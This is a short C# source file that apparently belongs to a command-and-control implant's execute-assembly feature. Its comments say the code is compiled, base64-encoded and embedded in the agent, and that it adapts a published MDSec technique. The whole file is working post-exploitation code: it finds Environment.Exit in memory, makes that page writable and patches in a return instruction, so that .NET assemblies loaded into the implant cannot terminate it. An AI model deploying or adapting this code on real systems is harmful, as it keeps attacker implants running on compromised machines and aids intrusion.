// used to patch Environment.Exit function to prevent assembly from terminating the agent
// bit modified version of https://www.mdsec.co.uk/2020/08/massaging-your-clr-preventing-environment-exit-in-in-process-net-assemblies/
// compile: C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /unsafe /optimize+ /debug- patch_exit.cs
// this code compiles, base64, and inserted into the agent func `execute_assembly` manually

using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Collections.Generic;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static void Main(string[] args)
    {
        var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
        var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");
        RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
        var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();

        unsafe
        {
            IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();
            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            if (VirtualQueryEx((IntPtr)(-1), target, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
            {
                if (mbi.Protect == 0x20) // PAGE_EXECUTE_READ
                {
                    // seems to be executable code
                    uint flOldProtect;
                    if (VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, 0x40, out flOldProtect)) // PAGE_EXECUTE_READWRITE
                    {
                        *(byte*)target = 0xc3; // ret
                        VirtualProtectEx((IntPtr)(-1), (IntPtr)target, (IntPtr)1, flOldProtect, out flOldProtect);
                    }
                }
            }
        }
    }
}
